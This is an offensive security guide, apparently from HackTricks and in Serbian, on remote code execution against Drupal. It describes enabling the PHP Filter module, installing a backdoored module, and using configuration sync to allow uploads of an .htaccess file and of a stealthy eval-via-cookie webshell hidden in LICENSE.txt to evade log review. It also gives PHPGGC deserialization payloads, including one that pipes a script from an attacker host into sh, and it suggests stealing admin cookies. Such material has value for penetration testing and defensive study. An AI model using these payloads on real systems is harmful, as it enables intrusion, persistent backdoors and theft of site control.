# Drupal RCE

{{#include ../../../banners/hacktricks-training.md}}

## Sa PHP Filter Module

> [!WARNING]
> U starijim verzijama Drupala **(pre verzije 8)** bilo je moguće prijaviti se kao admin i **omogućiti `PHP filter` module**, koji "Allows embedded PHP code/snippets to be evaluated." Ali od verzije 8 ovaj modul nije instaliran po defaultu.

1. Idite na **/modules/php** i ako se vrati 403 greška onda je **`PHP filter` plugin instaliran i možete nastaviti**
1. Ako nije, idite na `Modules` i označite polje `PHP Filter`, pa kliknite na `Save configuration`
2. Zatim, da biste ga iskoristili, kliknite na `Add content`, zatim izaberite `Basic Page` ili `Article` i napišite **PHP backdoor**, zatim u Text formatu izaberite `PHP` code i na kraju kliknite `Preview`
3. Da biste ga pokrenuli, jednostavno pristupite novokreiranom node-u:
```bash
curl http://drupal.local/node/3
```
## Instalirajte PHP Filter modul

> [!WARNING]
> U trenutnim verzijama više nije moguće instalirati plugin-e samo putem web interfejsa nakon podrazumevane instalacije.

Od verzije **8 pa nadalje, the** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **modul nije instaliran po defaultu**. Da bismo iskoristili ovu funkcionalnost, morali bismo da **instaliramo modul sami**.

1. Preuzmite najnoviju verziju modula sa Drupal veb-sajta.
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. Nakon preuzimanja idite na **`Administration`** > **`Reports`** > **`Available updates`**.
3. Kliknite na **`Browse`**, izaberite fajl iz direktorijuma u koji smo ga preuzeli, a zatim kliknite **`Install`**.
4. Kada se modul instalira, možemo kliknuti na **`Content`** i **napraviti novu osnovnu stranicu**, slično kao u primeru za Drupal 7. Ponovo, obavezno izaberite **`PHP code` iz `Text format` padajućeg menija**.

## Backdoored Module

> [!WARNING]
> U trenutnim verzijama više nije moguće instalirati plugin-e samo putem web interfejsa nakon podrazumevane instalacije.

Bilo je moguće **preuzeti** **modul**, dodati **backdoor** u njega i **instalirati** ga. Na primer, preuzimanje [**Trurnstile**](https://www.drupal.org/project/turnstile) modula u kompresovanom formatu, kreiranje nove PHP backdoor datoteke unutar njega i omogućavanje pristupa PHP fajlu pomoću `.htaccess` datoteke:
```html
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
A zatim idite na **`http://drupal.local/admin/modules/install`** da instalirate backdoored module i pristupite **`/modules/turnstile/back.php`** da biste ga izvršili.

## Backdooring Drupal with Configuration synchronization <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Post shared by** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Part 1 (activation of _Media_ and _Media Library_)

U meniju _Extend_ (/admin/modules) možete aktivirati elemente koji izgledaju kao već instalirani plugin-i. Po defaultu, plugin-i _Media_ i _Media Library_ ne izgledaju kao aktivirani, pa ih aktivirajmo.

Before activation:

<figure><img src="../../../images/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After activation:

<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Part 2 (leveraging feature _Configuration synchronization_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Iskorišćićemo funkciju _Configuration synchronization_ za izvoz (export) i uvoz (import) Drupal konfiguracionih unosa:

- /admin/config/development/configuration/single/export
- /admin/config/development/configuration/single/import

**Patch system.file.yml**

Počnimo tako što ćemo izmeniti prvi unos `allow_insecure_uploads` iz:

File: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

U:

Datoteka: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../images/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Ispravka field.field.media.document.field_media_document.yml**

Zatim izmenite drugi unos `file_extensions` iz:

Fajl: field.field.media.document.field_media_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../images/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

U:

Fajl: field.field.media.document.field_media_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Ne koristim to u ovom blogpostu, ali je navedeno da je moguće proizvoljno definisati unos `file_directory` i da je ranjivo na path traversal attack (tako da možemo ići naviše unutar Drupal filesystem tree).

<figure><img src="../../../images/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Deo 3 (iskorišćavanje funkcije _Add Document_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Poslednji korak je najjednostavniji i podeljen je na dva podkoraka. Prvi je da otpremimo fajl u .htaccess formatu kako bismo iskoristili Apache direktive i omogućili da .txt fajlovi budu interpretirani od strane PHP engine-a. Drugi je da otpremimo .txt fajl koji sadrži naš payload.

Fajl: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Zašto je ovaj trik zanimljiv?

Zato što, kada se Webshell (koji ćemo nazvati LICENSE.txt) postavi na Web server, možemo prenositi naše komande putem `$_COOKIE`, a u logovima Web servera to će se pojaviti kao legitimni GET request ka tekstualnom fajlu.

Zašto nazvati naš Webshell LICENSE.txt?

Jednostavno zato što, ako uzmemo sledeći fajl, na primer [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (koji je već prisutan u Drupal core), dobijamo fajl od 339 linija i veličine 17.6 KB, što je savršeno za dodavanje malog isečka PHP code negde u sredini (pošto je fajl dovoljno veliki).

<figure><img src="../../../images/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Fajl: Patched LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Deo 3.1 (otpremanje fajla .htaccess)**

Prvo koristimo _Dodaj dokument_ (/media/add/document) funkciju da otpremimo naš fajl koji sadrži Apache direktive (.htaccess).

<figure><img src="../../../images/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Deo 3.2 (otpremanje fajla LICENSE.txt)**

Zatim ponovo koristimo _Dodaj dokument_ (/media/add/document) funkciju da otpremimo Webshell sakriven u fajlu licence.

<figure><img src="../../../images/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### Deo 4 (interakcija sa Webshell-om) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Poslednji deo se sastoji od interakcije sa Webshell-om.

Kao što je prikazano na sledećem screenshot-u, ako cookie koji naš Webshell očekuje nije definisan, dobijemo sledeći rezultat kada konsultujemo fajl putem web pregledača.

<figure><img src="../../../images/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Kada napadač postavi cookie, može da komunicira sa Webshell-om i izvršava bilo koje komande koje želi.

<figure><img src="../../../images/image (15) (1).png" alt=""><figcaption></figcaption></figure>

I kao što se vidi u logovima, izgleda kao da je zatražen samo txt fajl.

<figure><img src="../../../images/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Hvala što ste odvojili vreme da pročitate ovaj članak, nadam se da će vam pomoći da dobijete neke shell-ove.

## Drupal core gadget chain (SA-CORE-2024-007 / SA-CORE-2024-008)

Dva advisoria objavljena **20 Nov 2024** (CVE-2024-55637 & CVE-2024-55638) opisuju nove **PHP object gadget chains in Drupal core** (7.0–7.101, 8.x, 10.2.0–10.2.10, 10.3.0–10.3.8, early 11.x). Oni **nisu direktno eksploatabilni** ali pružaju napadačima spreman chain čim bilo koji contrib/module izvrši `unserialize()` nad korisničkim unosom.

Praktični tok eksploatacije:

1. **Pronađite unserialize sink** (contrib modul ili prilagođeni kod). Pretražite kodnu bazu koristeći grep za `unserialize(` ili `Drupal\Component\Serialization\PhpSerialize::decode`. Ciljajte endpoint-e koji prihvataju POST/JSON ili uvoz konfiguracija.
2. **Generišite payload** koristeći path klase koja odgovara gadget chain-u. Nakon SA-CORE-2024-008, public chain je dodat u common payload generatore. Primer sa PHPGGC (commit ≥ Dec 2024):
```bash
./phpggc drupal/rce2 system 'id' > payload.ser
```
3. **Dostavite serijalizovani blob** do sinka (npr. parametar koji se deserializuje). Za telo enkodirano kao form:
```bash
curl -X POST https://target/admin/config/some/module \
-d "serialized_setting=$(cat payload.ser)"
```
4. **Pokrenite destrukciju** (često automatski na kraju zahteva) i izvršite komandu.

Napomene za testiranje:

- Gadget radi samo na verzijama **pre 10.2.11 / 10.3.9 / 7.102** (ispravljeno). Proverite verziju cilja putem `/core/lib/Drupal.php` ili `CHANGELOG.txt`.
- DB drajveri trećih strana mogu zahtevati dodatno očvršćavanje; tražite implementacije koje su preskočile prozor za bezbednosna ažuriranja.

## Nedavna contrib-module unsafe deserialization → RCE

Nekoliko contrib modula je sredilo nesigurne `unserialize()` puteve krajem 2024. Ako sajtu nedostaju ta ažuriranja, oni vam daju exploitable sink potreban za core gadget chain:

- **Mailjet** (<4.0.1, CVE-2024-13296): podaci pod kontrolom administratora prosleđeni u `unserialize()`, omogućavajući **PHP Object Injection → RCE** kada se poveže sa core gadgets.
- **Eloqua** (7.x-1.x < 1.15, CVE-2024-13297): slična nesigurna upotreba `unserialize()` dostupna korisnicima sa `access administration pages`.

Ideja za testiranje (za autentifikovane korisnike):
```bash
phpggc drupal/rce2 system 'bash -c "curl http://attacker/shell.sh|sh"' > p.ser
curl -b session=ADMINCOOKIE \
-F "import=@p.ser" https://target/admin/config/eloqua/import
```
Ako modul deserializuje otpremljene podatke, gadget chain dovodi do RCE. Kombinujte sa XSS/CSRF da biste ukrali admin cookies i ostvarili potpuni lanac napada.

## Reference

- [Drupal core – gadget chain – SA-CORE-2024-008](https://www.drupal.org/sa-core-2024-008)
- [Mailjet module – arbitrary PHP code execution – SA-CONTRIB-2024-062](https://www.drupal.org/sa-contrib-2024-062)

{{#include ../../../banners/hacktricks-training.md}}
